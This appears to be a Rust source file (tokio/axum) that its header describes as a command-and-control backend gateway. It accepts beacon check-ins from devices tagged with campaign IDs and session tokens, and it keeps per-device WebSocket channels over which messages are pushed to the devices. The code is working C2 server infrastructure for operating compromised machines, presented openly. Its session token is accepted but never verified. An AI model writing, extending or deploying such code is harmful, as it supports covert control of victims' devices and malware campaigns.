// [context: Rust, Linux/x64, tokio+axum, C2 backend gateway]
// Entry point for device beacons over HTTP/WebSocket

use axum::{
    extract::{Path, State, WebSocketUpgrade},
    http::StatusCode,
    response::IntoResponse,
    routing::{get, post},
    Json, Router,
};
use axum::extract::ws::{Message, WebSocket};
use dashmap::DashMap;
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use thiserror::Error;
use tokio::sync::mpsc;
use uuid::Uuid;
use std::time::{Duration, Instant};

#[derive(Error, Debug)]
pub enum GatewayError {
    #[error("auth failed")]
    AuthFailed,
    #[error("rate limited")]
    RateLimited,
    #[error("invalid payload")]
    InvalidPayload,
}

#[derive(Serialize, Deserialize, Clone)]
pub struct BeaconPayload {
    pub device_id: String,
    pub campaign_id: String,
    pub session_token: String,
    pub device_info: serde_json::Value,
    pub encrypted_data: Option<Vec<u8>>,
}

#[derive(Clone)]
struct RateLimitState {
    last_seen: Instant,
    count: u32,
}

pub type WsSender = mpsc::UnboundedSender<Message>;

#[derive(Clone)]
pub struct GatewayState {
    connections: Arc<DashMap<String, WsSender>>,
    rate_limits: Arc<DashMap<String, RateLimitState>>,
    device_registry: Arc<crate::device_registry::DeviceRegistry>,
}

impl GatewayState {
    pub fn new(device_registry: Arc<crate::device_registry::DeviceRegistry>) -> Self {
        Self {
            connections: Arc::new(DashMap::new()),
            rate_limits: Arc::new(DashMap::new()),
            device_registry,
        }
    }
}

pub struct Gateway {
    state: Arc<GatewayState>,
}

impl Gateway {
    pub fn new(state: Arc<GatewayState>) -> Self {
        Self { state }
    }

    pub fn router(state: Arc<GatewayState>) -> Router {
        Router::new()
            .route("/beacon", post(handle_beacon))
            .route("/ws/:device_id", get(ws_upgrade))
            .with_state(state)
    }

    pub async fn handle_beacon(
        &self,
        device_id: &str,
        payload: BeaconPayload,
    ) -> Result<(), GatewayError> {
        if !self.check_rate_limit(device_id) {
            return Err(GatewayError::RateLimited);
        }
        self.state
            .device_registry
            .update_last_seen(device_id)
            .await
            .map_err(|_| GatewayError::InvalidPayload)?;
        Ok(())
    }

    pub async fn route_to_channel(&self, device_id: &str, msg: Message) -> bool {
        if let Some(sender) = self.state.connections.get(device_id) {
            sender.send(msg).is_ok()
        } else {
            false
        }
    }

    fn check_rate_limit(&self, device_id: &str) -> bool {
        let mut entry = self.state.rate_limits.entry(device_id.to_string()).or_insert(
            RateLimitState { last_seen: Instant::now(), count: 0 },
        );
        let elapsed = entry.last_seen.elapsed();
        if elapsed > Duration::from_secs(60) {
            entry.count = 0;
            entry.last_seen = Instant::now();
        }
        entry.count += 1;
        entry.count <= 120
    }
}

async fn handle_beacon(
    State(state): State<Arc<GatewayState>>,
    Json(payload): Json<BeaconPayload>,
) -> impl IntoResponse {
    let gw = Gateway::new(state.clone());
    match gw.handle_beacon(&payload.device_id, payload).await {
        Ok(_) => StatusCode::OK.into_response(),
        Err(GatewayError::RateLimited) => StatusCode::TOO_MANY_REQUESTS.into_response(),
        Err(_) => StatusCode::BAD_REQUEST.into_response(),
    }
}

async fn ws_upgrade(
    State(state): State<Arc<GatewayState>>,
    Path(device_id): Path<String>,
    ws: WebSocketUpgrade,
) -> impl IntoResponse {
    ws.on_upgrade(move |socket| handle_ws(socket, device_id, state))
}

async fn handle_ws(socket: WebSocket, device_id: String, state: Arc<GatewayState>) {
    use futures_util::{sink::SinkExt, stream::StreamExt};
    let (mut ws_sink, mut ws_stream) = socket.split();
    let (tx, mut rx) = mpsc::unbounded_channel::<Message>();
    state.connections.insert(device_id.clone(), tx);

    let send_task = tokio::spawn(async move {
        while let Some(msg) = rx.recv().await {
            if ws_sink.send(msg).await.is_err() {
                break;
            }
        }
    });

    while let Some(Ok(msg)) = ws_stream.next().await {
        match msg {
            Message::Text(text) => {
                tracing::debug!("device {} sent: {}", device_id, text);
            }
            Message::Binary(data) => {
                tracing::debug!("device {} sent {} bytes", device_id, data.len());
            }
            Message::Close(_) => break,
            _ => {}
        }
    }

    state.connections.remove(&device_id);
    send_task.abort();
}
